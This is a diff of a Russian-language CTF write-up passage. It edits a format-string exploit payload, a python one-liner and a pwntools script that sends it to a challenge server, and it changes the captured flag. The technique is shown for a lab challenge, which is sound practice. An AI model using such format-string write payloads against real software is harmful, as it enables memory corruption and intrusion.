@@ -30,7 +30,7 @@ done
 
 Теперь считаем, сколько нужно добавить до 228 и модифицируем пэйлоад:
 
-`python -c "print '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%189d' + '%n'" | ./sick_format`
+`python -c "print '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%28d' + '%n'" | ./sick_format`
 
 Отлично, все работает, теперь сделаем то же самое на сервере, где запущен настоящий файл.
 
@@ -41,13 +41,13 @@ from pwn import *
 
 conn = remote('IP', PORT)
 
-payload = '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%189d' + '%n'
+payload = '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%28d' + '%n'
 
 conn.sendline(payload)
 print(conn.recv()) 
 print(conn.recv())
 ```
 
-Запускаем и получаем флаг **kxctf{f0rm4t1ng_str1ng_1s_c00l_d0nt_u_4gr33_w1th_m3_bruh?}**
+Запускаем и получаем флаг **kxctf{f0rm4t1ng_str1ng_1s_aw3s0me_bruh_1m_pr0ud_0f_u_ma_b0y_<3}**
 
 
